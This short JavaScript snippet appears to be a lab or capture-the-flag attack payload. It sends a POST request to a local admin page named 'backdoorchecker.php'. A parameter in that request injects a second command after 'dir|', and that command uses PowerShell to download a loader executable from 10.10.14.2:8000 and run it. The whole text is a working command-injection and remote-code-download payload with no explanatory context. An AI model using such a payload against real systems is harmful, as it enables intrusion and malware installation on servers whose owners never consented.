var request = new XMLHttpRequest();
var params = 'cmd=dir|powershell -c "iwr -uri http://10.10.14.2:8000/hexane_loader2.exe -outfile C:%temp%\\hexane.exe; cmd.exe -e %temp%\\hexane.exe';
request.open("POST", "http://localhost/admin/backdoorchecker.php", true);
request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
request.send(params);
